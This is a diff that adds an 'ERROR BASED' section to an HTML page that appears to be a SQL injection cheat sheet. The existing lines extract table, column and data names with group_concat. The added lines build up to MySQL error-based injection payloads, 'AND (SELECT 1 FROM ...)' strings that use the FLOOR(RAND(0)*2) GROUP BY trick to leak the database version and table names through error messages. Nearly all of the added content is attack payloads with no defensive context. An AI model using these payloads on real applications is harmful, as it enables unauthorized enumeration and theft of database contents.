@@ -45,3 +45,25 @@
 <p>group_concat(table_name) from information_schema.tables where table_schema=database()</p>
 <p>group_concat(column_name) from information_schema.columns where table_name='table_name'</p>
 <p>group_concat(data) from table_name</p>
+
+<h2>ERROR BASED</h2>
+<b>Intro</b><br> 
+
+SELECT count(*) from information_schema.tables;<br>
+SELECT rand();<br>
+SELECT floor(1.5);<br>
+select 1 from y;<br>
+select count(*),username from users group by username;<br>
+
+<b>Variable</b><br>
+SELECT count(*),CONCAT((SELECT @@version),0x3a,rand()) x FROM information_schema.tables group by x;<br>
+SELECT @x;<br>
+######
+SELECT count(*),CONCAT((SELECT @@version),0x3a,floor(rand()*2)) x FROM information_schema.tables group by x;<br>
+SELECT @x;<br>
+
+<b> Version</b><br>
+AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)<br>
+
+<b>Table</b><br>
+AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT (table_name) from information_schema.tables where table_schema=database() limit 0,1),0x3a,FLOOR(RAND(0)*2)) x<br> FROM information_schema.tables GROUP BY x) y)<br>
